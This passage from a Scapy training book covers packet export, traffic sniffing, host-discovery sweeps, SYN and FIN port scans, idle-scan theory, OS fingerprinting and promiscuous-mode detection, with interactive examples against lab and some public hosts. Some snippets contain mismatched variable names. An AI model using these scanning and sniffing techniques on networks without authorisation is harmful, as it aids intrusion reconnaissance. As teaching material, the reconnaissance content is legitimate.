chksum=0x9c90 id=0x5a61 seq=0x1 |&lt;Raw  load='\xe6\xdapI\xb6\xe5\x08\x00\x08\t\n
\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e
\x1f !&quot;#$%&amp;\'()*+,-./01234567' |&gt;&gt;&gt;&gt;
</code></pre>
<h2 id="hex-string"><a class="header" href="#hex-string">hex string</a></h2>
<p>You can also convert entire packet into a hex string using <code>str()</code> function:</p>
<pre><code>&gt;&gt;&gt; pkt
&lt;Ether  dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 |&lt;IP  version=4L 
ihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c 
src=192.168.25.130 dst=4.2.2.1 options='' |&lt;ICMP  type=echo-request code=0 
chksum=0x9c90 id=0x5a61 seq=0x1 |&lt;Raw  load='\xe6\xdapI\xb6\xe5\x08\x00\x08\t\n
\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e
\x1f !&quot;#$%&amp;\'()*+,-./01234567' |&gt;&gt;&gt;&gt;
&gt;&gt;&gt; pkt_str = str(pkt)
&gt;&gt;&gt; pkt_str
'\x00PV\xfc\xceP\x00\x0c)+S\x19\x08\x00E\x00\x00T\x00\x00@\x00@\x01Z|\xc0\xa8
\x19\x82\x04\x02\x02\x01\x08\x00\x9c\x90Za\x00\x01\xe6\xdapI\xb6\xe5\x08\x00
\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b
\x1c\x1d\x1e\x1f !&quot;#$%&amp;\'()*+,-./01234567'
</code></pre>
<h2 id="base64"><a class="header" href="#base64">Base64</a></h2>
<p>Scapy can export base64 encoded python data structure representing a packet using export_object() function.</p>
<pre><code>&gt;&gt;&gt; pkt
&lt;Ether  dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 |&lt;IP  version=4L 
ihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c 
src=192.168.25.130 dst=4.2.2.1 options='' |&lt;ICMP  type=echo-request code=0 
chksum=0x9c90 id=0x5a61 seq=0x1 |&lt;Raw  load='\xe6\xdapI\xb6\xe5\x08\x00\x08\t\n
\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f 
!&quot;#$%&amp;\'()*+,-./01234567' |&gt;&gt;&gt;&gt;
&gt;&gt;&gt; export_object(pkt)
eNplVwd4FNcRPt2dTqdTQ0JUUYwN+CgS0gkJONFEs5WxFDB+CdiI8+pupVl0d7uzRUiYtcEGG4ST
OD1OnB6nN6c4cXrvwQmk2U5xA9tgO70XMm+1rA78qdzbfTP/lDfzz7tD4WwmU1C0YiaT2Gqjaiao
bMlhCrsUSYrYoKbmcxZFXSpPiohlZikm6ltb063ZdGpNOjWQ7mhPt62hChHJWTbFvb0O/u1MD2bT
WZXXVCmi9pihUqI3FHdEQslriiVfWFTVT9VYpog6Q7fsjG0qRWtQNwsW1fRTrUg4xZxq5pUx1aS6
</code></pre>
<p>Output above can be reimported back into Skype using import_object() function:</p>
<pre><code>&gt;&gt;&gt; new_pkt = import_object()
eNplVwd4FNcRPt2dTqdTQ0JUUYwN+CgS0gkJONFEs5WxFDB+CdiI8+pupVl0d7uzRUiYtcEGG4ST
OD1OnB6nN6c4cXrvwQmk2U5xA9tgO70XMm+1rA78qdzbfTP/lDfzz7tD4WwmU1C0YiaT2Gqjaiao
bMlhCrsUSYrYoKbmcxZFXSpPiohlZikm6ltb063ZdGpNOjWQ7mhPt62hChHJWTbFvb0O/u1MD2bT
WZXXVCmi9pihUqI3FHdEQslriiVfWFTVT9VYpog6Q7fsjG0qRWtQNwsW1fRTrUg4xZxq5pUx1aS6
...
&gt;&gt;&gt; new_pkt
&lt;Ether  dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 |&lt;IP  version=4L 
ihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c 
src=192.168.25.130 dst=4.2.2.1 options='' |&lt;ICMP  type=echo-request code=0 
chksum=0x9c90 id=0x5a61 seq=0x1 |&lt;Raw  load='\xe6\xdapI\xb6\xe5\x08\x00\x08\t\n
\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f 
!&quot;#$%&amp;\'()*+,-./01234567' |&gt;&gt;&gt;&gt;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sniffing"><a class="header" href="#sniffing">Sniffing</a></h1>
<h2 id="sniff"><a class="header" href="#sniff">Sniff()</a></h2>
<ul>
<li>Scapy's in-built <code>sniff()</code> function helps us capture all traffic</li>
<li><code>sniff()</code> has <code>count</code>, <code>filter</code>, <code>iface</code>, <code>lfilter</code>, <code>prn</code>, <code>timeout</code> options</li>
<li>Can apply BPF filters (Same as TCPDUMP)</li>
</ul>
<pre><code>&gt;&gt;&gt; sniff(count=4, iface='eth3')
&lt;Sniffed: TCP:0 UDP:0 ICMP:0 Other:4&gt;
</code></pre>
<h2 id="sniffing-with-scapy"><a class="header" href="#sniffing-with-scapy">Sniffing with Scapy</a></h2>
<p>Scapy sniffer is not designed to be super fast so it can miss packets sometimes. Always use use tcpdump when you can, which is more simpler and efficient.</p>
<p>We can add filtering to capture only packets that are interesting to us. Use standard tcpdump/libpcap syntax:</p>
<pre><code>&gt;&gt;&gt; pkts = sniff(count=1,filter=&quot;tcp and host 64.233.167.99 and port 80&quot;)
</code></pre>
<pre><code>&gt;&gt;&gt; sniff(filter='arp', count=5, iface='vboxnet0')
&lt;Sniffed: TCP:0 UDP:0 ICMP:0 Other:5&gt;
&gt;&gt;&gt;
&gt;&gt;&gt; _.summary()
Ether / ARP who has 192.168.56.101 says 192.168.56.1
Ether / ARP who has 192.168.56.101 says 192.168.56.1
Ether / ARP who has 192.168.56.101 says 192.168.56.1
Ether / ARP who has 192.168.56.101 says 192.168.56.1
Ether / ARP who has 192.168.56.101 says 192.168.56.1
</code></pre>
<p>Simple traffic analyzer like tcpdump.</p>
<pre><code>&gt;&gt;&gt; pkts = sniff(count=5,filter=&quot;host 64.233.167.99&quot;,prn=lambda x:x.summary())
Ether / IP / TCP 192.168.1.100:33168 &gt; 64.233.167.99:www S
Ether / IP / TCP 64.233.167.99:www &gt; 192.168.1.100:33168 SA
Ether / IP / TCP 192.168.1.100:33168 &gt; 64.233.167.99:www A
Ether / IP / TCP 192.168.1.100:33168 &gt; 64.233.167.99:www PA / Raw
Ether / IP / TCP 64.233.167.99:www &gt; 192.168.1.100:33168 A
</code></pre>
<p>Scapy can sniff packets offline from pcap files.</p>
<pre><code>&gt;&gt;&gt; pkts = sniff(offline='http_google.pcap')
&gt;&gt;&gt; 
&gt;&gt;&gt; pkts.nsummary()
0000 Ether / IP / TCP 172.16.16.128:1606 &gt; 74.125.95.104:http S
0001 Ether / IP / TCP 74.125.95.104:http &gt; 172.16.16.128:1606 SA
0002 Ether / IP / TCP 172.16.16.128:1606 &gt; 74.125.95.104:http A
0003 Ether / IP / TCP 172.16.16.128:1606 &gt; 74.125.95.104:http PA / Raw
0004 Ether / IP / TCP 74.125.95.104:http &gt; 172.16.16.128:1606 A / Padding
</code></pre>
<pre><code>&gt;&gt;&gt; sniff(offline='http_google.pcap', lfilter = lambda s: s[TCP].flags == 18, prn = lambda x: x[IP].dst)
172.16.16.128
&lt;Sniffed: TCP:1 UDP:0 ICMP:0 Other:0&gt;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="network-recon"><a class="header" href="#network-recon">Network Recon</a></h1>
<ul>
<li><a href="recon/host_discovery.html">Host Discovery</a></li>
<li><a href="recon/service_discovery.html">Service Discovery</a></li>
<li><a href="recon/os_detection.html">OS Detection</a></li>
<li><a href="recon/promisc.html">Detect promisc mode</a></li>
<li><a href="recon/pcap_analysis.html">PCAP Analysis</a></li>
<li><a href="recon/traceroute.html">Traceroute</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="host-discovery"><a class="header" href="#host-discovery">Host Discovery</a></h1>
<p>Two steps to basic network reconnaissance.</p>
<pre><code>- Host Discovery
- Service Discovery (Port Scanning)
</code></pre>
<p><img src="recon/../imgs/pentest_phases.jpg" alt="pentesting-phases" /></p>
<h2 id="host-discovery-1"><a class="header" href="#host-discovery-1">Host Discovery</a></h2>
<ul>
<li>First step to network recon. Goal is to reduce a large set of IP ranges into a list of active or interesting hosts. (A 10.0.0.0/8 network can accomdate 16777200 hosts)</li>
<li>Port scanning is loud and also expensive on time and resources. More targets; More chances of being caught by an IDS.</li>
<li>Stringent narrowing down might lead to missing interesting targets. Liberal narrowing down can result in large set of machines to scan. Strike a balance based on the requirements.</li>
</ul>
<h3 id="tcp-syn-ping"><a class="header" href="#tcp-syn-ping">TCP SYN Ping</a></h3>
<ul>
<li>Send an empty TCP packet with only SYN bit set</li>
<li>SYN/ACK or RST in response indicates that a machine is up and running</li>
</ul>
<pre><code>&gt;&gt;&gt; ans,unans=sr( IP(dst=&quot;192.168.1.*&quot;)/TCP(dport=80,flags=&quot;S&quot;) )
&gt;&gt;&gt; ans.summary( lambda(s,r) : r.sprintf(&quot;%IP.src% is alive&quot;) )
192.168.56.101 is alive!
</code></pre>
<h3 id="tcp-ack-ping"><a class="header" href="#tcp-ack-ping">TCP ACK Ping</a></h3>
<ul>
<li>Send an empty TCP packet with only ACK bit set</li>
<li>Unsolicited ACK packets should be responded with RST which reveals a machine</li>
<li>SYN ping and ACK ping might seem redundant but most of the stateless firewalls won’t filter unsolicited ACK packets so it’s a better approach to use both ping tecnhiques</li>
</ul>
<pre><code>&gt;&gt;&gt; ans, unans = sr(IP(dst='192.168.56.99-105')/TCP(dport=80, flags='A'))
Begin emission:
Finished to send 7 packets.
......................^C
Received 25 packets, got 1 answers, remaining 6 packets
&gt;&gt;&gt; 
&gt;&gt;&gt; ans.summary(lambda(s,r): r.sprintf('{IP: %IP.src% is alive}'))
 192.168.56.101 is alive
&gt;&gt;&gt; 
</code></pre>
<h3 id="udp-ping"><a class="header" href="#udp-ping">UDP Ping</a></h3>
<ul>
<li>Send UDP packet to the given ports with or without payload, though protocol specific payload makes the scan more effective</li>
<li>Choose a port that’s most likely closed (Open UDP ports might recieve empty packets but ignore them)</li>
<li>ICMP port unreachable signifies that the machine is up</li>
</ul>
<h3 id="ip-protocol-ping"><a class="header" href="#ip-protocol-ping">IP Protocol ping</a></h3>
<ul>
<li>Send multiple packets with different protocol numbers set in their IP header, append proper protocol headers</li>
<li>Look for either responses using the same protocol as a probe, or ICMP protocol unreachable, either of the responses will signify a machine is alive</li>
</ul>
<h3 id="arp-ping"><a class="header" href="#arp-ping">ARP Ping</a></h3>
<ul>
<li>ARP Ping is employed when discovering active hosts on the same network/LAN</li>
<li>Faster and reliable because it operates on Layer 2 by using only ARP</li>
<li>ARP is the backbone protocol for any Layer 2 communication so always employ ARP ping when discovering hosts on local network</li>
<li>ARP doesn’t exist in IPv6 standard. For the equivalent, use Neighbor Discovery Protocol techniques instead.</li>
</ul>
<pre><code>&gt;&gt;&gt; ans,unans=srp(Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(pdst=&quot;192.168.56.0/24&quot;),timeout=2)
Begin emission:
**Finished to send 256 packets.

Received 2 packets, got 2 answers, remaining 254 packets
&gt;&gt;&gt; 
&gt;&gt;&gt; ans.summary(lambda (s,r): r.sprintf(&quot;%Ether.src% %ARP.psrc%&quot;) )
08:00:27:7b:2a:a9 192.168.56.100
08:00:27:37:86:85 192.168.56.101
&gt;&gt;&gt; 
</code></pre>
<h3 id="icmp-ping"><a class="header" href="#icmp-ping">ICMP Ping</a></h3>
<ul>
<li>ICMP scan involves the standard packets sent by the ubiquitous ping program</li>
<li>Send an ICMP type 8 (echo request) packet to the target IP, a ICMP type 0 (echo reply) indicates that the target is alive</li>
<li>Unfortunately, many hosts and firewalls now block these packets so a basic ICMP scan is unreliable</li>
<li>ICMP also supports timestamp request(13), and address mask request(17) which can reveal the availabilty of a machine</li>
</ul>
<pre><code>&gt;&gt;&gt; ans,unans=sr(IP(dst=&quot;192.168.56.99-110&quot;)/ICMP())
Begin emission:
Finished to send 12 packets.
Received 170 packets, got 1 answers, remaining 11 packets
&gt;&gt;&gt; 
&gt;&gt;&gt; ans.summary( lambda(s,r) : r.sprintf(&quot;{IP: %IP.src% is alive}&quot;) )
192.168.56.101 is alive
</code></pre>
<h2 id="exercise-time---network-sweeping"><a class="header" href="#exercise-time---network-sweeping">Exercise time - network sweeping</a></h2>
<p>Please solve Exercise 1 - Misc exercises</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="service-discovery"><a class="header" href="#service-discovery">Service Discovery</a></h1>
<h2 id="tcp-three-way-handshake"><a class="header" href="#tcp-three-way-handshake">TCP Three way handshake</a></h2>
<p><img src="recon/../imgs/threewayhandshake.png" alt="3wayhandshake" /></p>
<p>Three-way handshake captured using tcpdump</p>
<pre><code>192.168.56.1.35555 &gt; 192.168.56.102.4444: Flags [S] seq=12345   
192.168.56.102.4444 &gt; 192.168.56.1.35555: Flags [S.],  seq=9998 ack=12346
192.168.56.1.35555 &gt; 192.168.56.102.4444: Flags [.] seq=12346 ack=9999  
</code></pre>
<p>A note on tcpdump output:</p>
<ul>
<li>A port number is appended to the IP address with an additional dot. 192.168.56.1.35555 is IP 192.168.56.1 port 35555.</li>
<li>An ACK bit is represented by a . so [S.] is SYN-ACK, [.] is ACK.</li>
</ul>
<h3 id="crafting-the-three-way-handshake-in-scapy"><a class="header" href="#crafting-the-three-way-handshake-in-scapy">Crafting the Three-way Handshake in Scapy</a></h3>
<p>To craft three-way handshake we need to be able to record the response of the server and craft our responses based on server response.</p>
<h4 id="step-1---send-the-clients-syn-to-a-listening-server-syn"><a class="header" href="#step-1---send-the-clients-syn-to-a-listening-server-syn">Step 1 - Send the client’s SYN to a listening server (SYN)</a></h4>
<ul>
<li>Craft an IP header with the source and destination IP addresses.</li>
<li>Craft a TCP header where we generate the TCP source port, assign the destination port that the server listens on, set the TCP flags to turn the SYN bit on, and generate the client’s ISN.</li>
</ul>
<pre><code>ip=IP(src=&quot;10.0.0.1&quot;, dst=&quot;20.0.0.2&quot;)
syn_packet = TCP(sport=1500, dport=80, flags=&quot;S&quot;, seq=100)
</code></pre>
<h4 id="step-2---listen-for-the-servers-response-syn---ack"><a class="header" href="#step-2---listen-for-the-servers-response-syn---ack">Step 2 - Listen for the server’s response (SYN - ACK)</a></h4>
<ul>
<li>Save the server’s response. (ideally the response should be syn-ack)</li>
<li>Extract the server’s TCP sequence number and increment the value by one.</li>
</ul>
<pre><code>synack_packet = sr1(ip/syn_packet)
my_ack = syn_ack.seq+1
</code></pre>
<h4 id="step-3---send-an-acknowledgement-from-client-for-servers-response-ack"><a class="header" href="#step-3---send-an-acknowledgement-from-client-for-servers-response-ack">Step 3 - Send an acknowledgement from client for server’s response (ACK)</a></h4>
<ul>
<li>IP header has the same source and destination as the intial SYN packet.</li>
<li>TCP header has the same TCP source and destination ports as syn packet, only ACK bit is set, increment the client’s ISN by one since the SYN packet consumes one sequence number, set the acknowledgement value to the incremented server’s sequence number value.</li>
</ul>
<pre><code>ack_packet = TCP(sport=1500, dport=80, flags=&quot;A&quot;, seq=101, ack=my_ack)
send(ip/TCP_ACK)
</code></pre>
<p>If everything went right, we have just sucessfully established TCP three-way handshake.</p>
<blockquote>
<p><strong>Why RST?</strong></p>
<p>If you have noticed whenever we recieve a packet, our machine automatically responds with an RST packet.</p>
<p>The kernel is not aware of what Scapy is doing behind it’s back(Scapy is userland program). If Scapy sends a SYN, the target replies with a SYN-ACK and your kernel sees it as unsolicited packet, it will reply with an RST.</p>
<p>To prevent this, use local firewall rules (e.g. NetFilter/IPtables for Linux). Scapy does not mind about local firewalls.</p>
<pre><code>  iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 192.168.1.1 -j DROP
</code></pre>
</blockquote>
<h2 id="syn-scan"><a class="header" href="#syn-scan">SYN scan</a></h2>
<p><img src="recon/../imgs/connect_open.png" alt="connect-open" /></p>
<p><img src="recon/../imgs/connect_close.png" alt="connect-close" /></p>
<h3 id="syn-scan-on-single-target-single-port"><a class="header" href="#syn-scan-on-single-target-single-port">SYN scan on single target, single port</a></h3>
<ul>
<li>We send packets using <code>sr1</code> function</li>
<li>The response is just a single packet</li>
<li>We use Scapy’s <code>sprintf</code> method to print interesting fields in the response. (<code>SA</code> flags indicates open ports, <code>RA</code> flags indicates closed ports)</li>
</ul>
<pre><code>&gt;&gt;&gt; syn_packet = IP(dst='192.168.56.102')/TCP(dport=4444,flags='S')
&gt;&gt;&gt; resp = sr1(syn_packet)
&gt;&gt;&gt; resp.sprintf('%TCP.src% \t %TCP.sport% \t %TCP.flags%')
'192.168.56.102     4444      SA'
</code></pre>
<h3 id="syn-scan-on-single-target-multiple-ports"><a class="header" href="#syn-scan-on-single-target-multiple-ports">SYN scan on single target, multiple ports</a></h3>
<ul>
<li>We use <code>sr</code> function to send our packets</li>
<li><code>sr</code> returns answered probes and unanswered probes that we assign to two variables</li>
<li><code>ans</code> has all the answered probes in stimulus/response pairs(a tuple)</li>
<li>We use a simple lambda function to loop over the answered probes and print interesting fields</li>
</ul>
<p>In the below example, each entry in ans i.e. a stimuli response pair is passed on to a lambda function (stimuli &amp; response as <code>s</code>, <code>r</code> respectively). Inside lambda function, we use <code>sprintf</code> to extract interesting fields.</p>
<pre><code>&gt;&gt;&gt; ans, unans = sr(IP(dst=&quot;192.168.56.90&quot;)/TCP(dport=(20,24),flags=&quot;S&quot;))
&gt;&gt;&gt; ans.summary( lambda(s,r): r.sprintf(&quot;%TCP.sport% \t %TCP.flags%&quot;) )
'ftp_data    RA'
'21          RA
'ssh         SA'
'telnet      RA'
'24          RA'
</code></pre>
<h3 id="syn-scan-on-multiple-targets-multiple-ports"><a class="header" href="#syn-scan-on-multiple-targets-multiple-ports">SYN scan on multiple targets, multiple ports</a></h3>
<ul>
<li><code>make_table</code> is an advanced feature in scapy that helps you visualize larger and complex scans</li>
<li><code>make_table</code> takes three values - for rows, coloumns and the table data</li>
</ul>
<p>In the below example, target IPs are on x-axis, target ports on y-axis and the TCP flags in response are tabular data.</p>
<pre><code>&gt;&gt;&gt; ans,unans = sr(IP(dst=[&quot;scanme.nmap.org&quot;,&quot;egadz.metasploit.com&quot;])/TCP(dport=[10,20,30],flags=&quot;S&quot;))
&gt;&gt;&gt;
&gt;&gt;&gt; ans.make_table(lambda(s,r): (s.dst, s.dport,r.sprintf(&quot;%TCP.flags%&quot;)))

   45.33.32.156 198.58.109.32 
10 RA           SA            
20 RA           SA            
30 RA           SA
</code></pre>
<h2 id="fin-scan"><a class="header" href="#fin-scan">Fin scan</a></h2>
<p><img src="recon/../imgs/fin_scan.png" alt="fin-scan" /></p>
<h3 id="fin-scan-on-open-port---scapy"><a class="header" href="#fin-scan-on-open-port---scapy">Fin scan on open port - scapy</a></h3>
<pre><code>&gt;&gt;&gt; fin_packet = IP(dst='192.168.56.102')/TCP(dport=4444,flags='F')
&gt;&gt;&gt; resp = sr1(fin_packet)
Begin emission:
Finished to send 1 packets.
^C
Received 0 packets, got 0 answers, remaining 1 packets
</code></pre>
<h3 id="fin-scan-on-closed-port---scapy"><a class="header" href="#fin-scan-on-closed-port---scapy">Fin scan on closed port - scapy</a></h3>
<pre><code>&gt;&gt;&gt; fin_packet = IP(dst='192.168.56.102')/TCP(dport=6767,flags='F')
&gt;&gt;&gt; resp = sr1(fin_packet)
&gt;&gt;&gt; resp.sprintf('%TCP.flags%')
'RA'
</code></pre>
<h2 id="null-scan"><a class="header" href="#null-scan">Null scan</a></h2>
<p><img src="recon/../imgs/ns.png" alt="null-scan" /></p>
<h2 id="xmas-scan"><a class="header" href="#xmas-scan">Xmas scan</a></h2>
<p><img src="recon/../imgs/xmas_scan.png" alt="xmas-scan" /></p>
<h2 id="udp-scan"><a class="header" href="#udp-scan">UDP scan</a></h2>
<p><img src="recon/../imgs/udp_scan.png" alt="udp-scan" /></p>
<h2 id="exercise-time---port-scanning"><a class="header" href="#exercise-time---port-scanning">Exercise time - port scanning</a></h2>
<p>Please solve Exercise 2 - Misc exercises</p>
<h2 id="ip-id-scan-nmap-idle-scan"><a class="header" href="#ip-id-scan-nmap-idle-scan">IP ID Scan (nmap idle scan)</a></h2>
<p>In 1998, security researcher Antirez posted to the Bugtraq mailing list an ingenious new port scanning technique. Idle scan, as it has become known, allows for completely blind port scanning. Attackers can actually scan a target without sending a single packet to the target from their own IP address! Instead, a clever side-channel attack allows for the scan to be bounced off a dumb “zombie host”. Intrusion detection system (IDS) reports will finger the innocent zombie as the attacker.</p>
<p>Idle scan can be explained in following steps:</p>
<ul>
<li>One way to determine whether a TCP port is open is to send a SYN (session establishment) packet to the port. The target machine will respond with a SYN/ACK (session request acknowledgment) packet if the port is open, and RST (reset) if the port is closed. This is the basis of the previously discussed SYN scan.</li>
<li>A machine that receives an unsolicited SYN/ACK packet will respond with a RST. An unsolicited RST will be ignored.</li>
<li>Every IP packet on the Internet has a fragment identification number (IP ID). Since many operating systems simply increment this number for each packet they send, probing for the IP ID can tell an attacker how many packets have been sent since the last probe.</li>
</ul>
<p>By combining these traits, it is possible to scan a target network while forging your identity so that it looks like an innocent zombie machine did the scanning.</p>
<p><img src="recon/../imgs/ipid_scan.png" alt="ipid-scan" /></p>
<h2 id="exercise-time---ipidseq--ipidscanner"><a class="header" href="#exercise-time---ipidseq--ipidscanner">Exercise time - ipidseq &amp; ipidscanner</a></h2>
<p>Please solve Exercise 3 &amp; 4 - Misc exercises</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="remote-os-detection"><a class="header" href="#remote-os-detection">Remote OS Detection</a></h1>
<p>There are two approaches to finger printing remote Operating Systems:</p>
<p><strong>Active OS finger printing</strong></p>
<p>Active finger printing is when attacker sends a series of TCP and UDP packets to the remote host and examines practically every bit in the responses. After the tests the results are compared against the general behaviour of Operating Systems for a match.</p>
<p>Nmap is the most popular active OS detection tool. Nmap probes a target with large number of well crafted packets and the results are compared against Nmap’s database of OS fingerprints (nmap-os-db).</p>
<p>For more details on Nmap’s active OS detection techniques - <a href="https://nmap.org/book/man-os-detection.html">https://nmap.org/book/man-os-detection.html</a></p>
<p><strong>Passive OS fingerprinting</strong></p>
<p>Passive OS finger prining is analyzing network traffic to detect what operating system the client/server are running. This possible because of the difference in TCP/IP stack implemention in various operating systems. P0f is a popular passive finger printing tool with large database of finger prints.</p>
<p>For more details on p0f finger printing - <a href="http://lcamtuf.coredump.cx/p0f3/">http://lcamtuf.coredump.cx/p0f3/</a></p>
<h2 id="active-os-finger-printing"><a class="header" href="#active-os-finger-printing">Active OS finger printing</a></h2>
<h3 id="differences-in-protocol-implementations"><a class="header" href="#differences-in-protocol-implementations">Differences in protocol implementations</a></h3>
<p>RFC 793 says: “ACK (1 bit) – indicates that the Acknowledgment field is significant. All packets after the initial SYN packet sent by the client should have this flag set”.</p>
<p>But, IP stacks are written for different OSs by different people who read the RFCs and then write their interpretation of what the RFC outlines into code. This leads to a difference in how IP stacks are implemeted across OSes.</p>
<h4 id="linux-implementation"><a class="header" href="#linux-implementation">Linux implementation</a></h4>
<p>Linux kernel 2.4+ accepts and acknowledges a segment in an established session where no TCP flags are set and where the segment has payload No other well known current operating system accepts this same segment.</p>
<p>This behaviour of Linux network stack is complied into the kernel so it isn’t easy to alter it. This makes it a very foolproof technique for remote Linux OS detection.</p>
<p><strong>The Technique:</strong></p>
<p><img src="recon/../imgs/linux_detect.png" alt="active-linux-detection" /></p>
<ul>
<li>Establish a TCP three-way handshake with the target</li>
<li>All we have to do after handshake is to create a segment with no TCP flags and add some payload and send it</li>
</ul>
<pre><code>payload=&quot;just some data&quot;
data_packet = TCP(sport=1500, dport=80, flags=&quot;&quot;, seq=102, ack=my_ack)    # Notice that we explicitly mentioned to not set any flags
send(ip/data_packet/my_payload)
</code></pre>
<ul>
<li>If the target is Linux server(2.4+ kernel), you’ll see an ACK bit set in the response</li>
<li>In case of other Operating Systems, the response will most likely be a RST packet</li>
</ul>
<h2 id="passive-os-fingerprinting"><a class="header" href="#passive-os-fingerprinting">Passive OS fingerprinting</a></h2>
<h3 id="ttl--window-size-analysis"><a class="header" href="#ttl--window-size-analysis">TTL &amp; Window size analysis</a></h3>
<p><img src="recon/../imgs/ttl_window.png" alt="ttl-windows" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="promiscuous-mode-detection"><a class="header" href="#promiscuous-mode-detection">Promiscuous mode detection</a></h1>
<blockquote>
<p>You have an attacker sitting in your internal network, listening to all the traffic, you are running against time to find them! What do you do?</p>
</blockquote>
<h2 id="promiscuous-mode"><a class="header" href="#promiscuous-mode">Promiscuous mode</a></h2>
<ul>
<li>Promiscuous mode allows a network device to intercept and read each network packet that arrives in its entirety.</li>
<li>Unlike Monitor mode, in promisc mode the listener has to be connected to the network.</li>
<li>Some tools that use promiscuous mode - Wireshark, Tcpdump, Aircrack-ng, cain and abel, Snort, VirtualBox etc</li>
<li>Extremely effective because of it’s passive nature.</li>
</ul>
<p><strong>Enable promiscuous mode</strong></p>
<pre><code>$ sudo ifconfig &lt;iface&gt; promisc   
</code></pre>
<p><strong>Disable promiscuous mode</strong></p>
<pre><code>$ sudo ifconfig &lt;iface&gt; -promisc   
</code></pre>
<h2 id="detecting-promisc-node---the-idea"><a class="header" href="#detecting-promisc-node---the-idea">Detecting promisc node - The idea</a></h2>
<p>All the packets recieved by promisc NIC are passed on to the kernel, so the basic idea of detection is to send specially crafted packets that may trick the system kernel to respond to packets that it is not supposed to respond to in normal mode.</p>
<p>Fake ARP request packets, ICMP Ping(echo request) with wrong MAC but right IP address could do the job.</p>
<h3 id="hardware-filter"><a class="header" href="#hardware-filter">Hardware filter</a></h3>
<p>Normally, NIC of a machine filters and accepts only packets that have destination address set to the NIC’s own hardware address, broadcast address (FF FF FF FF FF FF), and multicast address 1(01 00 5E 00 00 01). Let’s call this a hardware filter, where packets are filtered by NIC based of destination address.</p>
<blockquote>
<p>In promiscuous mode, NIC is set to accept every packet that it recieves, like it has no hardware filtering.</p>
</blockquote>
<ul>
<li>Using the above information it should be easy to find promisc nodes, right?</li>
</ul>
<p>Just send packet using a destination address that is supposed to be filtered by hardware filter when in normal mode, only if a machine is in promisc mode, it would pass the packet to kernel without hardware filtering and would respond to that packet.</p>
<ul>
<li>Let’s send an ARP packet to destination 00:00:00:00:00:01. What happens??</li>
</ul>
<p>An ARP packet needs Ether header. You only have to set <code>dst</code> field in Ether header (to our selected address) and <code>pdst</code> field in ARP header (to the target IP address), all the other fields are filled in by Scapy.</p>
<pre><code>promisc_test = Ether(dst='00:00:00:00:00:01')/ARP(pdst='192.168.56.101')
</code></pre>
<p>If our logic was correct, a promisc machine should reply to this packet but we didn’t get a reply. It could be either that the target is not in promisc mode or there is some more filtering going on.</p>
<h3 id="software-filter"><a class="header" href="#software-filter">Software Filter</a></h3>
<ul>
<li>Operating system kernels implement a filter, let’s call it software filter.</li>
<li>Even though a packet passes through hardware filter, kernel is implementing another filter and this mechanism is filtering out some other addresses so we are not getting a response.</li>
</ul>
<h3 id="breaking-hardware-filter--software-filter"><a class="header" href="#breaking-hardware-filter--software-filter">Breaking Hardware filter &amp; Software filter</a></h3>
<p>The hardware filter usually blocks packets that are not supposed to arrive to the system kernel.</p>
<p>We need to craft a packet that is:</p>
<ul>
<li>Blocked by the hardware filter in normal mode, only passed to kernel in promisc mode.</li>
<li>Should be able to pass the software filter.</li>
</ul>
<h4 id="final-test"><a class="header" href="#final-test">Final test</a></h4>
<p>The following table is a collection of special set of MAC addresses and the machines behaviour when it recieves a packet with one of these addresses as destination in the Ethernet header.</p>
<p>A machine in promisc mode will reply to the below packet (given the <code>pdst</code> matches it's IP)</p>
<pre><code>promisc_test = Ether(dst='FF:FF:FF:FF:FF:FE')/ARP(pdst='192.168.56.107')
</code></pre>
<p>If you notice, only a Linux machine in promisc mode responds to the address <code>01:00:00:00:00:00</code>, this could be used as a simple OS detection technique.</p>
<pre><code>promisc_test = Ether(dst='01:00:00:00:00:00')/ARP(pdst='192.168.56.107')
# Any machine that answers to this is probably a Linux machine in promisc mode
</code></pre>
<p><img src="recon/../imgs/promisc_table.png" alt="promisc-table" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="pcap-analysis"><a class="header" href="#pcap-analysis">PCAP Analysis</a></h1>
<ul>
<li>Scapy has pretty handy functions for handling PCAP files</li>
<li>Although there are dedicated tools like dpkt, pcapy etc to deal with packet captures (using Python), Scapy is still a go-to tool for PCAP analysis because of it’s dense methods that aid you in number of packet analysis operations</li>
<li>Although Scapy is all powerful, it’s takes a lot of memory when reading packets so analysing larger packet captures will take toll on your system memory</li>
</ul>
<h2 id="pcap-operations"><a class="header" href="#pcap-operations">PCAP operations</a></h2>
<blockquote>
<p><strong>Memory matters!</strong></p>
<p>Scapy looks at each packet as a class which takes toll on the system memory, so it is not a right choice for analysing large PCAPs</p>
<p>When investigating large PCAP’s(several Giga Bytes) use light-weight tools like Tshark for initial analysis, when investigation boils down to smaller set of packets, use Scapy.</p>
</blockquote>
<h3 id="reading-pcap"><a class="header" href="#reading-pcap">Reading PCAP</a></h3>
<p>You can read a PCAP file in Scapy using rdpcap function.</p>
<pre><code>&gt;&gt;&gt; rdpcap('port_knock_seq.pcap')
